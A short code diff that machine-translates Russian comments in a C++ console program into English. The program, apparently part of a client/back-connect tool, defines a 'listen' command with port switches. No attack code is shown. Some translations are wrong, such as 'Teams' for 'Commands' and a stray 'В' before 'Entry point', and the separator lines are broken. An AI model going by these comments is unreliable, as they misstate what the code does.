@@ -14,7 +14,7 @@
 
 COREDATA coreData;
 
-//Опции для Listen.
+//Options for Listen.
 static const Cui::SWITCH listenSwitches[] =
 {
   {lng_switch_nologo,                lng_switch_nologo_help},
@@ -24,7 +24,7 @@ static const Cui::SWITCH listenSwitches[] =
   {lng_switch_clientport L":[port]", lng_switch_clientport_help}
 };
 
-//Команды
+//Teams
 void commandListen(LPWSTR *switches, DWORD switchesCount);
 
 static const Cui::COMMAND commands[] =
@@ -32,7 +32,7 @@ static const Cui::COMMAND commands[] =
   {lng_command_listen, lng_command_listen_help, commandListen, (Cui::SWITCH *)listenSwitches, sizeof(listenSwitches) / sizeof(Cui::SWITCH)}
 };
 
-////////////////////////////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ////////////////////////////////////////////////
 
 void Core::init(void)
 {
@@ -53,9 +53,9 @@ void Core::showLogo(void)
   Console::writeFormatW(lng_logo, VERSION_MAJOR(BO_CLIENT_VERSION), VERSION_MINOR(BO_CLIENT_VERSION), VERSION_SUBMINOR(BO_CLIENT_VERSION), VERSION_BUILD(BO_CLIENT_VERSION));
 }
 
-///////////////////////////////////////////////////////////////////////////////
-// Точка входа.
-///////////////////////////////////////////////////////////////////////////////
+//////////////////////////////////////////////////// ///////////////////////////
+//В Entry point.
+//////////////////////////////////////////////////// ///////////////////////////
 
 void WINAPI entryPoint(void)
 {
